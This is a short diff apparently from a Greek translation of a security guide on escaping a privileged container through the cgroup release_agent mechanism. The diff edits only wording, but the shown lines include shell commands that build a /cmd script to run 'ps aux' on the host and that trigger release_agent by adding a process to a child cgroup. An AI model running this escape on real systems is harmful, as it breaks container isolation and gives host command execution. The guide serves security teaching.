@@ -54,9 +54,9 @@ echo '#!/bin/sh' > /cmd
 echo "ps aux > $host_path/output" >> /cmd
 chmod a+x /cmd
 ```
-5. **Ενεργοποίηση της Επίθεσης:**
-* Μια διαδικασία ξεκινά εντός του "x" child cgroup και τερματίζεται αμέσως.
-* Αυτό ενεργοποιεί τον `release_agent` (το σενάριο /cmd), το οποίο εκτελεί ps aux στον host και γράφει την έξοδο στο /output εντός του container.
+5. **Trigger the Attack:**
+* Μια διαδικασία ξεκινά μέσα στο "x" child cgroup και τερματίζεται αμέσως.
+* Αυτό ενεργοποιεί τον `release_agent` (το σενάριο /cmd), το οποίο εκτελεί ps aux στον host και γράφει την έξοδο στο /output μέσα στο container.
 ```shell
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
